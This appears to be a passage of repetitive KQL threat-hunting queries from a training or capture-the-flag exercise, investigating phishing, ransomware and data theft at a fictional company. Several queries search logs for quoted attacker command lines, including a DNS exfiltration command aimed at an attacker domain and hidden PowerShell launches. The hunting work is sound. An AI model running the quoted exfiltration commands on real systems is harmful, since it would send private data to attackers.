| where sender contains "castleandsand_official@outlook.com" or sender contains "castleandsandlegaldepartment@gmail.com"
| distinct recipient;
let targeted_id_addr =
Employees
| distinct ip_addr;
let targeted_username =
Employees
| where email_addr in (targeted_roles)
| distinct username;
let targeted_Authentication =
AuthenticationEvents
| where not(src_ip in (targeted_id_addr)) and result == "Successful Login" and username in (targeted_username) and description !has "incorrect"
| distinct src_ip;
InboundNetworkEvents
| where src_ip in (targeted_Authentication)
| where url has "download=true&"
| extend Filename = tostring(parse_url(url).['Query Parameters']['output'])
| distinct src_ip

let targeted_roles =
Email
| where sender contains "castleandsand_official@outlook.com" or sender contains "castleandsandlegaldepartment@gmail.com"
| distinct recipient;
let targeted_id_addr =
Employees
| distinct ip_addr;
let targeted_username =
Employees
| where email_addr in (targeted_roles)
| distinct username;
let targeted_Authentication =
AuthenticationEvents
| where not(src_ip in (targeted_id_addr)) and result == "Successful Login" and username in (targeted_username) and description !has "incorrect"
| distinct src_ip;
let targeted_domain =
PassiveDns
| where ip in (targeted_Authentication)
| distinct domain;

let targeted_roles =
Email
| where sender contains "castleandsand_official@outlook.com" or sender contains "castleandsandlegaldepartment@gmail.com"
| distinct recipient;
let targeted_id_addr =
Employees
| distinct ip_addr;
let targeted_username =
Employees
| where email_addr in (targeted_roles)
| distinct username;
AuthenticationEvents
| where username in (targeted_username)
| where result == "Successful Login"
| distinct hostname

let targeted_roles =
Email
| where sender contains "castleandsand_official@outlook.com" or sender contains "castleandsandlegaldepartment@gmail.com"
| distinct recipient;
let targeted_id_addr =
Employees
| distinct ip_addr;
let targeted_username =
Employees
| where email_addr in (targeted_roles)
| distinct username;
let external_ip_list =
AuthenticationEvents
| where not(src_ip in (targeted_id_addr)) and result == "Successful Login" and username in (targeted_username)
| distinct src_ip;
let domain_list =
PassiveDns
| where ip in (external_ip_list)
| distinct domain;
let filenames =
OutboundNetworkEvents
| where tostring(parse_url(url).Host) in (domain_list)
| distinct url
| extend Path = tostring(parse_url(url).Path)
| extend Filename = tostring(parse_path(Path).Filename)
| distinct Filename;
FileCreationEvents
| where filename in (filenames)
| distinct filename

let victim_hostname =
FileCreationEvents
| where filename in ("Work-Updates.docx", "HR_Notes.pdf", "employee.lnk", "Employee_Changes.xlsx", "store_updates.xlsx")
| distinct hostname;
FileCreationEvents
| where hostname in (victim_hostname)
| distinct hostname

ProcessEvents
// All related processes
| where parent_process_name in ("TSVIPSrv.dll", "1.exe", "i.exe", "wmi.dll", "procdump64.exe")
| where process_commandline has "plink.exe"
| distinct process_commandline

let victim_hostname =
FileCreationEvents
| where filename in ("Work-Updates.docx", "HR_Notes.pdf", "employee.lnk", "Employee_Changes.xlsx", "store_updates.xlsx")
| distinct hostname;
ProcessEvents
| where hostname in (victim_hostname)
| where process_commandline !contains "c:\\" and process_commandline !contains "exe" and process_commandline !contains "$"

let victim_hostname =
FileCreationEvents
| where filename in ("Work-Updates.docx", "HR_Notes.pdf", "employee.lnk", "Employee_Changes.xlsx", "store_updates.xlsx")
| distinct hostname;
ProcessEvents
| where hostname in (victim_hostname)
| where process_commandline !contains "c:\\" and process_commandline !contains "exe" and process_commandline !contains "$"
| distinct hostname

ProcessEvents
| where process_commandline contains "Invoke-DNSExfiltrator -i Invoke-DNSExfiltrator.ps1 -d exfil.castlesand.zip -p ssad3 -doh cloudflare -t 500"
| distinct hostname

let victim_hostname =
ProcessEvents
| where process_commandline contains "Invoke-DNSExfiltrator -i Invoke-DNSExfiltrator.ps1 -d exfil.castlesand.zip -p ssad3 -doh cloudflare -t 500"
| distinct hostname;
Employees
| where hostname in (victim_hostname)
| distinct role

let victim_hostname =
ProcessEvents
| where process_commandline contains "Invoke-DNSExfiltrator -i Invoke-DNSExfiltrator.ps1 -d exfil.castlesand.zip -p ssad3 -doh cloudflare -t 500"
| distinct hostname;
Employees
| where hostname in (victim_hostname)
| distinct ip_addr

// 5-1, 5-2

let targeted_roles =
Email
| where sender contains "castleandsand_official@outlook.com" or sender contains "castleandsandlegaldepartment@gmail.com"
| distinct recipient;
let targeted_id_addr =
Employees
| distinct ip_addr;
let targeted_username =
Employees
| where email_addr in (targeted_roles)
| distinct username;
let external_ip_list =
AuthenticationEvents
| where not(src_ip in (targeted_id_addr)) and result == "Successful Login" and username in (targeted_username)
| distinct src_ip;
PassiveDns
| where ip in (external_ip_list)
| distinct ip

Email
| take 10

Employees
| count

Employees
| where ip_addr has "10.10.2.1"

Employees
| where name contains "Jacqueline"
// jacqueline_henderson@castleandsand.com

Email
| where recipient contains "jacqueline_henderson@castleandsand.com"

Email
| where sender has "sunandsandtrading.com"
| distinct sender
| count

Employees
| where name contains "Cristin Genao"

OutboundNetworkEvents
| where src_ip contains "10.10.0.141"
| distinct url

PassiveDns
| where domain contains "shark"
| distinct domain

PassiveDns
| where domain contains "shark"

let karen_ip =
Employees
| where name contains "Karen"
| distinct ip_addr;
OutboundNetworkEvents
| where src_ip in (karen_ip)
| distinct url

FileCreationEvents
| where filename contains "PAY_UP_OR_SWIM_WITH_THE_FISHES.txt"
| distinct hostname

let hostname_ransomware =
FileCreationEvents
| where filename contains "PAY_UP_OR_SWIM_WITH_THE_FISHES.txt"
| distinct hostname;
Employees
| where hostname in (hostname_ransomware)
| distinct role

let IT_hostname =
Employees
| where role has "IT"
| distinct username;
AuthenticationEvents
| where username in (IT_hostname)

let unique_hostnames = 
FileCreationEvents
| where filename == "PAY_UP_OR_SWIM_WITH_THE_FISHES.txt"
| distinct hostname;
Employees
| where hostname in (unique_hostnames)
| where role == "IT Helpdesk"
| count

Employees
| where ip_addr has ".46"

let impact_hosts = FileCreationEvents
| where filename == 'PAY_UP_OR_SWIM_WITH_THE_FISHES.txt'
| distinct hostname;
SecurityAlerts
| where description has_any (impact_hosts)

let impact_hosts = FileCreationEvents
| where filename == 'PAY_UP_OR_SWIM_WITH_THE_FISHES.txt'
| distinct hostname;
let helpdesk_hostnames = Employees
| where hostname in (impact_hosts)
| where role contains "IT Helpdesk"
| distinct hostname;
SecurityAlerts
| where description has_any (helpdesk_hostnames)
//A suspicious file was quarantined on host 6S7W-MACHINE: Chomping-Schedule_Changes.xlsx

Employees
| where hostname contains "6S7W"

FileCreationEvents
| where filename == 'Chomping-Schedule_Changes.xlsx'
| where hostname contains "6S7W"

FileCreationEvents
| where filename == 'Chomping-Schedule_Changes.xlsx'
| distinct hostname

let emp_hostnames =
FileCreationEvents
| where filename == "Chomping-Schedule_Changes.xlsx"
| distinct hostname;
let emp_ip =
Employees
| where hostname in (emp_hostnames)
| distinct ip_addr;
OutboundNetworkEvents
| where src_ip in (emp_ip)
| distinct url
| where url has "xlsx"
| count

let preston_lane_ip =
Employees
| where hostname == "6S7W-MACHINE"
| distinct ip_addr;
OutboundNetworkEvents
| where src_ip in (preston_lane_ip)
| distinct url
| where url has "xlsx"

PassiveDns
| where domain contains "jawfin"
| distinct ip
// 193.248.75.126

let returned_query = 
PassiveDns
| where domain contains "sharkfin" or domain contains "jawfin"
| distinct ip;
InboundNetworkEvents
| where src_ip in (returned_query)

let returned_ip = 
PassiveDns
| where domain contains "sharkfin" or domain contains "jawfin"
| distinct ip;
AuthenticationEvents
| where src_ip in (returned_ip)

Email
| where link contains "sharkfin" or link contains "jawfin"

Email
| where sender contains "legal.sand@verizon.com"

let email_list =
Email
| where (sender == "legal.sand@verizon.com") and (recipient contains "castleandsand.com")
| distinct reply_to; 
Email
| where (reply_to has_any (email_list)) or (recipient has_any (email_list))
| count

let email_list =
Email
| where (sender == "legal.sand@verizon.com") and (recipient contains "castleandsand.com")
| distinct reply_to; 
Email
| where (reply_to has_any (email_list)) or (recipient has_any (email_list))
| extend Result = tostring(parse_url(link).Host) // Getting the Host section only
| distinct Result

let email_list =
Email
| where (sender == "legal.sand@verizon.com") and (recipient contains "castleandsand.com")
| distinct reply_to; 
let threat_domain =
Email
| where (reply_to has_any (email_list)) or (recipient has_any (email_list))
| extend Result = tostring(parse_url(link).Host) // Getting the Host section only
| distinct Result;
PassiveDns
| where domain in (threat_domain)
| distinct ip

let email_list =
Email
| where (sender == "legal.sand@verizon.com") and (recipient contains "castleandsand.com")
| distinct reply_to; 
let threat_domain =
Email
| where (reply_to has_any (email_list)) or (recipient has_any (email_list))
| extend Result = tostring(parse_url(link).Host) // Getting the Host section only
| distinct Result;
let threat_account =
PassiveDns
| where domain in (threat_domain)
| distinct ip;
AuthenticationEvents
| where src_ip in (threat_account)
| count 

let email_list =
Email
| where (sender == "legal.sand@verizon.com") and (recipient contains "castleandsand.com")
| distinct reply_to; 
Email
| where (reply_to has_any (email_list)) or (recipient has_any (email_list))
| extend Path = tostring(parse_url(link).Path) // Getting the Path section only
| extend Filename = tostring(parse_path(Path).Filename)
| distinct Filename

let email_list =
Email
| where (sender == "legal.sand@verizon.com") and (recipient contains "castleandsand.com")
| distinct reply_to; 
let file_list =
Email
| where (reply_to has_any (email_list)) or (recipient has_any (email_list))
| extend Path = tostring(parse_url(link).Path) // Getting the Path section only
| extend Filename = tostring(parse_path(Path).Filename)
| distinct Filename;
FileCreationEvents
| where filename in (file_list)

let email_list =
Email
| where (sender == "legal.sand@verizon.com") and (recipient contains "castleandsand.com")
| distinct reply_to; 
let file_list =
Email
| where (reply_to has_any (email_list)) or (recipient has_any (email_list))
| extend Path = tostring(parse_url(link).Path) // Getting the Path section only
| extend Filename = tostring(parse_path(Path).Filename)
| distinct Filename;
let hostname_list =
FileCreationEvents
| where filename in (file_list)
| distinct hostname;
ProcessEvents
| where hostname in (hostname_list)
| where timestamp > datetime(2023-05-25T16:43:20Z)
// 220.35.180.137

let email_list =
Email
| where (sender == "legal.sand@verizon.com") and (recipient contains "castleandsand.com")
| distinct reply_to; 
let file_list =
Email
| where (reply_to has_any (email_list)) or (recipient has_any (email_list))
| extend Path = tostring(parse_url(link).Path) // Getting the Path section only
| extend Filename = tostring(parse_path(Path).Filename)
| distinct Filename;
let hostname_list =
FileCreationEvents
| where filename in (file_list)
| distinct hostname;
ProcessEvents
| where hostname in (hostname_list)
| where timestamp > datetime(2023-05-25T16:43:20Z)
| where process_name contains "powershell"

let email_list =
Email
| where (sender == "legal.sand@verizon.com") and (recipient contains "castleandsand.com")
| distinct reply_to; 
let file_list =
Email
| where (reply_to has_any (email_list)) or (recipient has_any (email_list))
| extend Path = tostring(parse_url(link).Path) // Getting the Path section only
| extend Filename = tostring(parse_path(Path).Filename)
| distinct Filename;
let hostname_list =
FileCreationEvents
| where filename in (file_list)
| distinct hostname;
ProcessEvents
| where hostname in (hostname_list)
| where timestamp > datetime(2023-05-25T16:43:20Z)
| where process_name contains "echo"

let email_list =
Email
| where (sender == "legal.sand@verizon.com") and (recipient contains "castleandsand.com")
| distinct reply_to; 
let file_list =
Email
| where (reply_to has_any (email_list)) or (recipient has_any (email_list))
| extend Path = tostring(parse_url(link).Path) // Getting the Path section only
| extend Filename = tostring(parse_path(Path).Filename)
| distinct Filename;
let hostname_list =
FileCreationEvents
| where filename in (file_list)
| distinct hostname;
ProcessEvents
| where hostname in (hostname_list)
| where timestamp > datetime(2023-05-25T16:43:20Z)
| where process_name contains "powershell"
| where process_commandline contains "powershell.exe -nop -w hidden -c"
| sort by process_commandline

let email_list =
Email
| where (sender == "legal.sand@verizon.com") and (recipient contains "castleandsand.com")
| distinct reply_to; 
let file_list =
Email
| where (reply_to has_any (email_list)) or (recipient has_any (email_list))
| extend Path = tostring(parse_url(link).Path) // Getting the Path section only
| extend Filename = tostring(parse_path(Path).Filename)
| distinct Filename;
let hostname_list =
FileCreationEvents
| where filename in (file_list)
| distinct hostname;
let parent_process_list =
ProcessEvents
| where hostname in (hostname_list)
| where timestamp > datetime(2023-05-25T16:43:20Z)
| where process_name contains "powershell"
| where process_commandline contains "powershell.exe -nop -w hidden -c"
| distinct parent_process_name;
ProcessEvents
| where parent_process_name in (parent_process_list)

let email_list =
Email
| where (sender == "legal.sand@verizon.com") and (recipient contains "castleandsand.com")
| distinct reply_to; 
let filename_list =
Email
| where (reply_to has_any (email_list)) or (recipient has_any (email_list))
| extend Path = tostring(parse_url(link).Path) // Getting the Path section only
| extend Filename = tostring(parse_path(Path).Filename)
| distinct Filename;
let hostname_list =
FileCreationEvents
| where filename in (filename_list)
| distinct hostname;
let parent_process_list =
ProcessEvents
| where hostname in (hostname_list)
| where timestamp > datetime(2023-05-25T16:43:20Z)
| where process_name == "powershell.exe"
| where process_commandline contains "powershell.exe -nop -w hidden -c"
| distinct parent_process_name;
ProcessEvents
| where process_commandline has_any (parent_process_list)

FileCreationEvents
| where filename endswith ".sharkfin"

Email
| where link contains "shark"

// onionmail.org

PassiveDns
| where domain contains "jawfin"
// https://www.maxmind.com/en/geoip-demo

// https://search.censys.io/hosts/193.248.75.126

let returned_query = 
PassiveDns
| where domain contains "sharkfin" or domain contains "jawfin"
| distinct ip;
InboundNetworkEvents
| where src_ip in (returned_query)
| distinct src_ip
// https://search.censys.io/hosts/157.242.169.232

let email_list =
Email
| where (sender == "legal.sand@verizon.com") and (recipient contains "castleandsand.com")
| distinct reply_to; 
Email
| where (reply_to has_any (email_list)) or (recipient has_any (email_list))

let email_list =
Email
| where (sender == "legal.sand@verizon.com") and (recipient contains "castleandsand.com")
| distinct reply_to; 
let file_list =
Email
| where (reply_to has_any (email_list)) or (recipient has_any (email_list))
| extend Path = tostring(parse_url(link).Path) // Getting the Path section only
| extend Filename = tostring(parse_path(Path).Filename)
| distinct Filename;
FileCreationEvents
| where filename in (file_list)
// https://attack.mitre.org/software/

// https://attack.mitre.org/software/S0002/

let email_list =
Email
| where (sender == "legal.sand@verizon.com") and (recipient contains "castleandsand.com")
| distinct reply_to; 
let file_list =
Email
| where (reply_to has_any (email_list)) or (recipient has_any (email_list))
| extend Path = tostring(parse_url(link).Path) // Getting the Path section only
| extend Filename = tostring(parse_path(Path).Filename)
| distinct Filename;
let hostname_list =
FileCreationEvents
| where filename in (file_list)
| distinct hostname;
let parent_process_list =
ProcessEvents
| where hostname in (hostname_list)
| where timestamp > datetime(2023-05-25T16:43:20Z)
| where process_name contains "powershell"
| where process_commandline contains "powershell.exe -nop -w hidden -c"
| distinct parent_process_name;
ProcessEvents
| where parent_process_name in (parent_process_list)
| distinct parent_process_hash

// https://www.virustotal.com/gui/home/upload

// The ransomware family known as Rorschach abuses the legitimate Cortex XDR Dump Service Tool cy.exe to deploy its malicious payload.

Email
| where sender contains "castleandsand_official@outlook.com"

Email
| where sender contains "castleandsand_official@outlook.com" or sender contains "castleandsandlegaldepartment@gmail.com"

Email 
| where sender startswith "castleandsand_official@outlook.com" or sender startswith "castleandsandlegaldepartment@gmail.com" 
| extend Result = tostring(parse_url(link).Host) // Getting the Host section only
| distinct Result

let targeted_roles =
Email
| where sender contains "castleandsand_official@outlook.com" or sender contains "castleandsandlegaldepartment@gmail.com"
| distinct recipient;
Employees
| where email_addr in (targeted_roles)
| distinct role

let targeted_roles =
Email
| where sender contains "castleandsand_official@outlook.com" or sender contains "castleandsandlegaldepartment@gmail.com"
| distinct recipient;
let targeted_id_addr =
Employees
| distinct ip_addr;
let targeted_username =
Employees
| where email_addr in (targeted_roles)
| distinct username;
AuthenticationEvents
| where not(src_ip in (targeted_id_addr)) and result == "Successful Login" and username in (targeted_username) and description !has "incorrect"
| distinct src_ip

let targeted_roles =
Email
| where sender contains "castleandsand_official@outlook.com" or sender contains "castleandsandlegaldepartment@gmail.com"
| distinct recipient;
let targeted_id_addr =
Employees
| distinct ip_addr;
let targeted_username =
Employees
| where email_addr in (targeted_roles)
| distinct username;
let targeted_Authentication =
AuthenticationEvents
| where not(src_ip in (targeted_id_addr)) and result == "Successful Login" and username in (targeted_username) and description !has "incorrect"
| distinct src_ip;
InboundNetworkEvents
| where src_ip in (targeted_Authentication)
| where url has "download=true&"
| extend Filename = tostring(parse_url(url).['Query Parameters']['output'])
| distinct Filename

let targeted_roles =
Email
| where sender contains "castleandsand_official@outlook.com" or sender contains "castleandsandlegaldepartment@gmail.com"
| distinct recipient;
let targeted_id_addr =
Employees
| distinct ip_addr;
let targeted_username =
Employees
| where email_addr in (targeted_roles)
| distinct username;
let targeted_Authentication =
AuthenticationEvents
| where not(src_ip in (targeted_id_addr)) and result == "Successful Login" and username in (targeted_username) and description !has "incorrect"
| distinct src_ip;
InboundNetworkEvents
| where src_ip in (targeted_Authentication)
| where url has "download=true&"
| extend Filename = tostring(parse_url(url).['Query Parameters']['output'])
| distinct src_ip

let targeted_roles =
Email
| where sender contains "castleandsand_official@outlook.com" or sender contains "castleandsandlegaldepartment@gmail.com"
| distinct recipient;
let targeted_id_addr =
Employees
| distinct ip_addr;
let targeted_username =
Employees
| where email_addr in (targeted_roles)
| distinct username;
let targeted_Authentication =
AuthenticationEvents
| where not(src_ip in (targeted_id_addr)) and result == "Successful Login" and username in (targeted_username) and description !has "incorrect"
| distinct src_ip;
let targeted_domain =
PassiveDns
| where ip in (targeted_Authentication)
| distinct domain;

let targeted_roles =
Email
| where sender contains "castleandsand_official@outlook.com" or sender contains "castleandsandlegaldepartment@gmail.com"
| distinct recipient;
let targeted_id_addr =
Employees
| distinct ip_addr;
let targeted_username =
Employees
| where email_addr in (targeted_roles)
| distinct username;
AuthenticationEvents
| where username in (targeted_username)
| where result == "Successful Login"
| distinct hostname

let targeted_roles =
Email
| where sender contains "castleandsand_official@outlook.com" or sender contains "castleandsandlegaldepartment@gmail.com"
| distinct recipient;
let targeted_id_addr =
Employees
| distinct ip_addr;
let targeted_username =
Employees
| where email_addr in (targeted_roles)
| distinct username;
let external_ip_list =
AuthenticationEvents
| where not(src_ip in (targeted_id_addr)) and result == "Successful Login" and username in (targeted_username)
| distinct src_ip;
let domain_list =
PassiveDns
| where ip in (external_ip_list)
| distinct domain;
let filenames =
OutboundNetworkEvents
| where tostring(parse_url(url).Host) in (domain_list)
| distinct url
| extend Path = tostring(parse_url(url).Path)
| extend Filename = tostring(parse_path(Path).Filename)
| distinct Filename;
FileCreationEvents
| where filename in (filenames)
| distinct filename

let victim_hostname =
FileCreationEvents
| where filename in ("Work-Updates.docx", "HR_Notes.pdf", "employee.lnk", "Employee_Changes.xlsx", "store_updates.xlsx")
| distinct hostname;
FileCreationEvents
| where hostname in (victim_hostname)
| distinct hostname

ProcessEvents
// All related processes
| where parent_process_name in ("TSVIPSrv.dll", "1.exe", "i.exe", "wmi.dll", "procdump64.exe")
| where process_commandline has "plink.exe"
| distinct process_commandline

let victim_hostname =
FileCreationEvents
| where filename in ("Work-Updates.docx", "HR_Notes.pdf", "employee.lnk", "Employee_Changes.xlsx", "store_updates.xlsx")
| distinct hostname;
ProcessEvents
| where hostname in (victim_hostname)
| where process_commandline !contains "c:\\" and process_commandline !contains "exe" and process_commandline !contains "$"

let victim_hostname =
FileCreationEvents
| where filename in ("Work-Updates.docx", "HR_Notes.pdf", "employee.lnk", "Employee_Changes.xlsx", "store_updates.xlsx")
| distinct hostname;
ProcessEvents
| where hostname in (victim_hostname)
| where process_commandline !contains "c:\\" and process_commandline !contains "exe" and process_commandline !contains "$"
| distinct hostname

ProcessEvents
| where process_commandline contains "Invoke-DNSExfiltrator -i Invoke-DNSExfiltrator.ps1 -d exfil.castlesand.zip -p ssad3 -doh cloudflare -t 500"
| distinct hostname

let victim_hostname =
ProcessEvents
| where process_commandline contains "Invoke-DNSExfiltrator -i Invoke-DNSExfiltrator.ps1 -d exfil.castlesand.zip -p ssad3 -doh cloudflare -t 500"
| distinct hostname;
Employees
| where hostname in (victim_hostname)
| distinct role

let victim_hostname =
ProcessEvents
| where process_commandline contains "Invoke-DNSExfiltrator -i Invoke-DNSExfiltrator.ps1 -d exfil.castlesand.zip -p ssad3 -doh cloudflare -t 500"
| distinct hostname;
Employees
| where hostname in (victim_hostname)
| distinct ip_addr

// 5-1, 5-2

let targeted_roles =
Email
| where sender contains "castleandsand_official@outlook.com" or sender contains "castleandsandlegaldepartment@gmail.com"
| distinct recipient;
let targeted_id_addr =
Employees
| distinct ip_addr;
let targeted_username =
Employees
| where email_addr in (targeted_roles)
| distinct username;
let external_ip_list =
AuthenticationEvents
| where not(src_ip in (targeted_id_addr)) and result == "Successful Login" and username in (targeted_username)
| distinct src_ip;
PassiveDns
| where ip in (external_ip_list)
| distinct ip

//5-3, 5-4, 5-5

let victim_hostname =
FileCreationEvents
| where filename in ("Work-Updates.docx", "HR_Notes.pdf", "employee.lnk", "Employee_Changes.xlsx", "store_updates.xlsx")
| distinct hostname;
ProcessEvents
| where hostname in (victim_hostname)
| distinct parent_process_hash

// 5-6
// https://github.com/Arno0x/DNSExfiltrator/tree/master

// https://deathcon.io/

```
